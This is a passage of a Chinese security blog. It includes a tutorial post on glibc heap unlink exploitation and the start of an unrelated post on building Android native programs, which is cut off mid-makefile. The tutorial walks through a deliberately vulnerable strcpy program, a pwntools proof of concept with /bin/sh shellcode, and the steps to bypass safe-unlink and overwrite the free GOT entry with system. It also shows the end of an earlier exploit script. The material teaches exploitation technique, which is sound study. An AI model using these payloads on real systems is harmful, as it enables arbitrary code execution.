|</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>
<p>delete note1就会触发unlink，使note0的地址变成<code>note0-&gt;pos-0x18</code>，这时对note0进行编辑即对note_table进行编辑：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line"></span><br><span class="line">payload2 = p64(notelen) + p64(<span class="number">1</span>) + p64(<span class="number">0x8</span>) + p64(free_got) + <span class="string">&quot;A&quot;</span>*<span class="number">16</span> + p64(binsh_addr)</span><br><span class="line">payload2 += <span class="string">&quot;A&quot;</span>* (notelen*<span class="number">3</span>-<span class="built_in">len</span>(payload2))</span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">0</span>, payload2)</span><br><span class="line">edit_note(<span class="number">0</span>, p64(system_sh_addr))</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>完整<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1dFbjZnb">exp</a><br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://drops.wooyun.org/binary/10638">http://drops.wooyun.org/binary/10638</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/05/07/Heap-Overflow-Using-Unlink/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/05/07/Heap-Overflow-Using-Unlink/" class="post-title-link" itemprop="url">Heap Overflow Using Unlink</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-05-07 15:59:55" itemprop="dateCreated datePublished" datetime="2016-05-07T15:59:55+08:00">2016-05-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这种方法适用于glibc版本&lt;2.26  </p>
<h3 id="glibc-malloc基础"><a href="#glibc-malloc基础" class="headerlink" title="glibc malloc基础"></a>glibc malloc基础</h3><p><a target="_blank" rel="noopener" href="http://code.woboq.org/userspace/glibc/malloc/malloc.c.html">在线malloc.c源码</a><br>在malloc.c中找到chunk结构的相关代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">    INTERNAL_SIZE_T prev_size; <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">    INTERNAL_SIZE_T size;      <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>   <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">    <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>heap chunk结构如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+-----------+---------+------+------+-------------+</span><br><span class="line">|           |         |      |      |             |</span><br><span class="line">|           |         |      |      |             |</span><br><span class="line">| prev_size |size&amp;Flag|  fd  |  bk  |             |</span><br><span class="line">|           |         |      |      |             |</span><br><span class="line">|           |         |      |      |             |</span><br><span class="line">+-----------+---------+------+------+-------------+</span><br></pre></td></tr></table></figure>
<p>如果当前chunk前面相邻的chunk空闲，那么<code>prev_size</code>记录前一个chunk的大小，如果不空闲，prev_size区域是前面chunk的数据部分。<br><code>size</code>是当前chunk的大小，因为chunk的大小都是8字节对齐，size的低三位一定会空闲出来，低三位就用作三个<code>Flag</code>标识位。<br><code>fd</code>和<code>bk</code>是在当前chunk为空闲时，分别指向下一个和上一个空闲chunk，串联成一个空闲chunk的<code>双向链表</code>。<br>详细介绍请参考我的<a target="_blank" rel="noopener" href="http://pwn4.fun/2016/04/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3glibc-malloc/">另一篇Blog</a></p>
<h3 id="经典的unlink利用方法"><a href="#经典的unlink利用方法" class="headerlink" title="经典的unlink利用方法"></a>经典的unlink利用方法</h3><p>有漏洞的演示程序：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *first, *second;</span><br><span class="line">    first = <span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">    second = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(first);</span><br><span class="line">    <span class="built_in">free</span>(second);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>strcpy</code>函数导致堆溢出，<code>argv[1]</code>大于666字节时，会覆盖下一个chunk的chunk头，能够导致任意代码执行。<br>堆的结构如下：<br><img src="/images/unlinkdoublefree/heap_segment.png"><br>1.没有攻击者时，第一个free做了以下工作：<br><strong>不是mmap创建的chunk，会向前或向后合并</strong><br><strong>向后合并：</strong></p>
<ul>
<li><code>判断前一个chunk是否空闲</code> 如果当前释放的chunk的PREV_INUSE（P）位设为0，则前一个chunk空闲。本例中，因为”first”的PREV_INUSE位设为1，所以前一个chunk不是空闲的，默认堆内存的第一个chunk的前一个chunk是allocated（即使它不存在）。</li>
<li><code>如果空闲，则合并</code> 例如，从binlist中将前一个chunk移除（unlink），把前一个chunk的大小加到当前大小，改变chunk指针指向前一个chunk。本例中，前一个chunk是allocated，所以没有调用unlink。因此当前的空闲chunk “first”不能向后合并。</li>
</ul>
<p><strong>向前合并：</strong></p>
<ul>
<li><code>判断下个chunk是否空闲</code> 如果下下个chunk（相对当前释放的chunk而言）的PREV_INUSE（P）位设为0，则下个chunk是空闲的。为了找到下下个 chunk，将当前释放chunk的大小加到它的chunk指针就得到下个chunk的指针，然后将下个chunk的大小加到下个chunk指针就能得到下下个chunk。本例中，当前释放的”first” chunk的下下个chunk是top chunk，它的PREV_INUSE位是1，因此下个chunk “second”没有被释放。</li>
<li><code>如果空闲，则合并</code> 例如，将下个chunk从它的binlist中移除（unlink），把下个chunk的大小加到当前大小。本例中，下一个chunk是allocated，因此没有调用unlink。因此，当前释放的chunk “first”不能向前合并。</li>
</ul>
<p><strong>将合并后的chunk加到unsorted bin。</strong>本例中，因为没有合并发生，所以把”first” chunk加到unsorted bin。</p>
<p>2.攻击者在strcpy中覆盖了”second” chunk的chunk头：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">prev_size &#x3D; 偶数</span><br><span class="line">size &#x3D; -4</span><br><span class="line">fd &#x3D; free@got - 12</span><br><span class="line">bk &#x3D; shellcode address</span><br></pre></td></tr></table></figure>
<p>有攻击者时，第一个free做了如下工作：<br>向前合并：</p>
<ul>
<li>当前释放的”frist” chunk的下下个chunk不是top chunk。因为攻击者将”second” chunk的大小覆盖为-4, 所以下下个chunk在”second” chunk偏移为-4的位置。因此现在<code>glibc malloc</code>把”second” chunk的prev_size当做下下个chunk的size。因为攻击者把prev_size覆盖为偶数（PREV_INUSE位为0），<code>glibc malloc</code>以为”second” chunk是空闲的。</li>
<li>如果空闲，则合并 将下个chunk从它的binlist中移除（unlink），把下个chunk的大小加到当前大小。本例中，下个chunk（second）是空闲的，因此会发生合并，触发<code>unlink(second)</code>宏：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD &#x3D; second-&gt;fd (本例中fd是free@got-12)</span><br><span class="line">BK &#x3D; second-&gt;bk (本例中bk是shellcode的地址)</span><br><span class="line">FD-&gt;bk &#x3D; BK</span><br><span class="line">BK-&gt;fd &#x3D; FD</span><br></pre></td></tr></table></figure></li>
<li>把”second” chunk的fd和bk拷贝到变量<code>FD</code>和<code>BK</code>。本例中，<code>FD = free@got-12</code>, <code>BK = shellcode address</code>(攻击者将shellcode放在”first”堆空间中)</li>
<li>FD是<code>malloc_chunk</code>结构体指针，因此FD-&gt;bk相当于FD+12。本例中，<code>FD+12 = free@got-12+12</code>，即指向<code>free</code>对应的GOT条目。</li>
<li>因此FD-&gt;bk = BK相当于<code>free@got = shellcode address</code>（free对应的GOT条目被覆盖成了shellcode地址）。</li>
<li>现在第二个free调用时就会执行shellcode。</li>
</ul>
<p>漏洞程序的poc如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./heapover&#x27;</span>)</span><br><span class="line">got_free = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&#x27;</span></span><br><span class="line"><span class="built_in">print</span> shellcode + <span class="string">&#x27;\x90&#x27;</span> * (<span class="number">0x2a0</span> - <span class="built_in">len</span>(shellcode) - <span class="number">8</span>) + p32(<span class="number">0xdefaced</span>) + p32(<span class="number">0xfffffffc</span>) + p32(got_free<span class="number">-12</span>) + p32(<span class="number">0x0804b008</span>)</span><br></pre></td></tr></table></figure>
<p>这个poc只是说明一下利用方法，实际不能运行，下面就是原因。</p>
<h3 id="unlink-2-0"><a href="#unlink-2-0" class="headerlink" title="unlink 2.0"></a>unlink 2.0</h3><p>现在的glibc都是采取了保护机制的，想要利用unlink没有以前那么方便了。<br>新版本glib中的unlink宏：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                                \</span></span><br><span class="line">    FD = P-&gt;fd;                                                                \</span><br><span class="line">    BK = P-&gt;bk;                                                                \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);   \</span><br><span class="line">    <span class="keyword">else</span> &#123;                                                                     \</span><br><span class="line">        FD-&gt;bk = BK;                                                           \</span><br><span class="line">        BK-&gt;fd = FD;                                                           \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                                       \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                 \</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)         \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))     \</span><br><span class="line">              malloc_printerr (check_action,                                   \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,     \</span><br><span class="line">                               P, AV);                                         \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                     \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                       \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      \</span><br><span class="line">                <span class="keyword">else</span> &#123;                                                         \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                          \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                          \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                          \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                          \</span><br><span class="line">                  &#125;                                                            \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                                         \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                  \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                  \</span><br><span class="line">              &#125;                                                                \</span><br><span class="line">          &#125;                                                                    \</span><br><span class="line">      &#125;                                                                        \</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最大的阻碍就是下面这部分代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P);</span><br></pre></td></tr></table></figure>
<p>这段代码加到<code>unlink</code>宏后，再调用unlink宏时，chunk指针<code>FD-&gt;bk</code>(即P-&gt;fd-&gt;bk)应该是p指针自己，<code>BK-&gt;fd</code>也是。<br>上一部分中，我们修改了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;bk = shellcode address</span><br><span class="line">p-&gt;fd = <span class="built_in">free</span>@got<span class="number">-12</span></span><br></pre></td></tr></table></figure>
<p>这样改使得<code>FD-&gt;bk</code>为<code>free@got</code>，而<code>BK-&gt;fd</code>是<code>shellcode+8</code>不能通过，上文的利用方式不能成功。<br>想要绕过这段代码需要在内存中找到一个已知的地址X指向p（地址X中保存p的值），修改如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd = <span class="number">0x0804bfa0</span> - <span class="number">0xc</span> <span class="comment">// 0x0804bfa0是地址X</span></span><br><span class="line">bk = <span class="number">0x0804bfa0</span> - <span class="number">0x8</span></span><br></pre></td></tr></table></figure>
<p>这样修改，unlink执行</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd; <span class="comment">// 0x0804bfa0 - 0xc</span></span><br><span class="line">BK = P-&gt;bk; <span class="comment">// 0x0804bfa0 - 0x8</span></span><br></pre></td></tr></table></figure>
<p>使得<code>FD-&gt;bk == P</code>且<code>BK-&gt;fd == P</code>，即可绕过检查代码。unlink接着执行</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD; <span class="comment">// p = 0x0804bfa0 - 0xc</span></span><br></pre></td></tr></table></figure>
<p>再对p指向的chunk进行写入，’A’ * 0xc + overwrite，就可以将p覆盖成某一值。<br><strong>具体过程借<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1skDedsx">一个示例</a>讲解</strong><br>这个程序在free时没有检验指针的有效性，没有在free之后将野指针清空。可以任意指定每一个chunk的大小。<br>利用步骤如下：<br>1.分配两个长度合适的chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chunk0                malloc返回的ptr        chunk1        malloc返回的ptr</span><br><span class="line">|                     |                     |             |</span><br><span class="line">+-----------+---------+---+---+-------------+------+------+----+----+------+</span><br><span class="line">|           |         |   |   |             |      |      |    |    |      |</span><br><span class="line">|           |         |   |   |             | prev | size&amp;|    |    |      |</span><br><span class="line">| prev_size |size&amp;Flag|   |   |             | size | flag |    |    |      |</span><br><span class="line">|           |         |   |   |             |      |      |    |    |      |</span><br><span class="line">|           |         |   |   |             |      |      |    |    |      |</span><br><span class="line">+-----------+---------+---+---+-------------+------+------+----+----+------+</span><br></pre></td></tr></table></figure>
<p>chunk0大小为504，chunk1大小为512，内容随意。<br>2.对chunk0进行编辑，设置好chunk0的fd、bk并溢出chunk1，改好chunk0的chunk头控制信息如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">chunk0                malloc返回的p             chunk1        malloc返回的p</span><br><span class="line">|                     |                        |             |</span><br><span class="line">+-----------+---------+----+----+----+----+----+------+------+----+----+------+</span><br><span class="line">|           |         |fake|fake|fake|fake| D  | fake | fake |    |    |      |</span><br><span class="line">|           |         |prev|size| fd | bk | A  | prev | size&amp;|    |    |      |</span><br><span class="line">| prev_size |size&amp;Flag|size|    |    |    | T  | size | flag |    |    |      |</span><br><span class="line">|           |         |    |    |    |    | A  |      |      |    |    |      |</span><br><span class="line">|           |         |    |    |    |    |    |      |      |    |    |      |</span><br><span class="line">+-----------+---------+----+----+----+----+----+------+------+----+----+------+</span><br><span class="line">                      |--------new_size--------|</span><br></pre></td></tr></table></figure>
<p>为了欺骗glibc，让它以为malloc chunk0时返回的指针p就是chunk0指针，因此改写chunk1的prev_size为上图所示的<code>new_size</code>，将chunk1 size部分设为chunk1的实际大小（<code>PREV_INUSE</code>为0）。如此就做好了unlink触发的准备。<br>3.再新分配一个chunk2，内容为<code>/bin/sh</code>，为后面调用<code>system()</code>做准备。<br>4.删掉chunk1，触发unlink(p)，将p改写。<br>删除chunk1时，glibc会检查PREV_INUSE的值，发现前一个chunk是空闲的（实际是我们伪造的），glibc会合并两个相邻的空闲块。glibc会先将chunk0从binlist中解引用，触发unlink(p)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FD &#x3D; p-&gt;fd(实际是0x0804bfa0-0xc，因为全局数组保存p值的地址是0x0804bfa0)</span><br><span class="line">BK &#x3D; p-&gt;bk(实际是0x0804bfa0-0x8)</span><br><span class="line">检查是否满足上文所示的限制，由于FD-&gt;bk和BK-&gt;fd均为*0x0804bfa0(p)，由此可以过掉这个限制</span><br><span class="line">FD-&gt;bk &#x3D; BK</span><br><span class="line">BK-&gt;fd &#x3D; FD(p &#x3D; 0x0804bfa0-0xc)</span><br></pre></td></tr></table></figure>
<p>存储指针的全局变量a的结构如图所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p           0   1   2</span><br><span class="line">|           |   |   |</span><br><span class="line">+---+---+---+---+---+---+</span><br><span class="line">|   |   |   | p |   |   | ...</span><br><span class="line">+---+---+---+---+---+---+</span><br></pre></td></tr></table></figure>
<p>5.对chunk0进行edit，填写内容为<code>&#39;A&#39;*0xc + p32(0x0804a014)</code>其中0x0804a014为free的got地址，edit之后p指针被free的got地址覆盖，此时print就会打印出所有的got地址。<br><img src="/images/unlinkdoublefree/got.png"><br>6.根据泄露出的实际内存地址，计算出system函数的实际内存地址，将system的地址当做free的地址，其它地址不变，重新写回got。<br>7.Free chunk2就相当于调用<code>system(&quot;/bin/sh&quot;)</code>，即可获得shell。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/">https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/</a><br><a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/7326">http://drops.wooyun.org/tips/7326</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/04/19/gcc%E6%89%8B%E5%8A%A8%E7%BC%96%E8%AF%91Android%E5%8E%9F%E7%94%9F%E7%A8%8B%E5%BA%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/04/19/gcc%E6%89%8B%E5%8A%A8%E7%BC%96%E8%AF%91Android%E5%8E%9F%E7%94%9F%E7%A8%8B%E5%BA%8F/" class="post-title-link" itemprop="url">gcc手动编译Android原生程序</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-04-19 16:01:47" itemprop="dateCreated datePublished" datetime="2016-04-19T16:01:47+08:00">2016-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>编译原生程序：</p>
<ul>
<li>使用gcc编译器写makefile文件手动编译</li>
<li>使用ndk-build工具自动编译</li>
</ul>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><code>path_to/android-ndk-r10c/toolchains/arm-linux-androideabi-4.9/prebuilt/ darwin-x86_64/bin</code>目录下保存着完整的工具链：<br><strong>arm-linux-androideabi-g++</strong> C++编译工具<br><strong>arm-linux-androideabi-gcc</strong> C编译工具<br><strong>arm-linux-androideabi-gdb</strong> 调试工具<br><strong>arm-linux-androideabi-ld</strong> 链接器，用于生成可执行程序<br><strong>arm-linux-androideabi-nm</strong> 列出目标文件中的符号<br><strong>arm-linux-androideabi-objdump</strong> 输出目标文件的信息<br><strong>arm-linux-androideabi-readelf</strong> 显示elf格式可执行文件信息<br><strong>arm-linux-androideabi-size</strong> 列出目标文件每一段的大小<br><strong>arm-linux-androideabi-strings</strong> 列出目标文件的可打印字符串<br><strong>arm-linux-androideabi-strip</strong> 去除目标文件中的符号信息<br>编写简单的C程序：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> plaintext[<span class="number">128</span>] = <span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in encrypt!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    encrypt();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编写makefile</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CC = arm-linux-androideabi-gcc</span><br><span class="line">ANDROID_NDK=/Users/fan/Computer/Android/adt-bundle-mac-x86_64-20140702/android-ndk-r10c</span><br><span class="line">NDK_TOOLS=<span class="variable">$(ANDROID_NDK)</span>/toolchains/arm-linux-androideabi-4.9/prebuilt/darwin-x86_64/bin</span><br><span class="line">TOOLCHAINS_INCLUDE=<span class="variable">$(ANDROID_NDK)</span>/toolchains/arm-linux-androideabi-4.9/prebuilt/darwin-x86_64/lib/gcc/arm-linux-androideabi/4.9/include-fixed</span><br><span class="line">PLATFORM_INCLUDE=<span class="variable">$(ANDROID_NDK)</span>/platforms/android-21/arch-arm/usr/<span class="keyword">include</span></span><br><span class="line">PLATFORM_LIB=<span class="variable">$(ANDROID_NDK)</span>/platforms/android-21/arch-arm/usr/lib</span><br><span class="line">FLAGS=-I<span class="variable">$(TOOLCHAINS_INCLUDE)</span> \</span><br><span class="line">    -I<span class="variable">$(PLATFORM_INCLUDE)</span> \</span><br><span class="line">    -L<span class="variable">$(PLATFORM_LIB)</span> \</span><br><span class="line">    -fPIC \</span><br><span class="line">    -shared \</span><br><span class="line">    -llog</span><br><span class="line"></span><br><span class="line"><span class="section">test: test.o</span></span><br><span class="line">    <span class="variable">$(CC)</span> test.o <span class="variable">$(FLAGS)</span> -o test</span><br><span class="line"><span class="section">test.o: test.c</span></span><br><span class="line">    <span 